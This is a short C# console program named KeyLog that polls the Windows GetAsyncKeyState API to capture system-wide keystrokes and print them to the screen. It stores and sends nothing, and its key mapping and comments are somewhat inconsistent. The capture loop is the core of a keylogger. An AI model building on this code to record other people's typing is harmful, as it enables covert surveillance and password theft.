using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLog {
    class Program {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args) {
            Console.WriteLine("This Will NOT Save any Logged Keys.");

            while (true) {
                Thread.Sleep(100);

                for (int i = 8; i < 221; i++) {
                    int keyState = GetAsyncKeyState(i);
                    // replace -32767 with 32769 for windows 10.
                    //keyState == 1 || keyState == 32769
                    if (keyState == 1 || keyState == 32769) {
                        Console.Write(ReturnKey(i));
                        break;
                    }
                }
            }

        }
        static String ReturnKey(int i) {
            string output;

            if (i >= 32 && i <= 96) {
                char LTR = (char)i;
                output = LTR.ToString();
            }
            else if (i >= 123 && i <= 127) {
                char LTR = (char)i;
                output = LTR.ToString();
            }
            else if (i == 13) {
                output = "\n";
            }
            else if (i == 8) {
                output = "(BACKSPACE_8)";
            }
            else {
                output = $"({i})";
            }
            //switch (i) {
            //    default:
            //        output = $"({i})";
            //        break;
            //}

            return output;
        }
    }
}
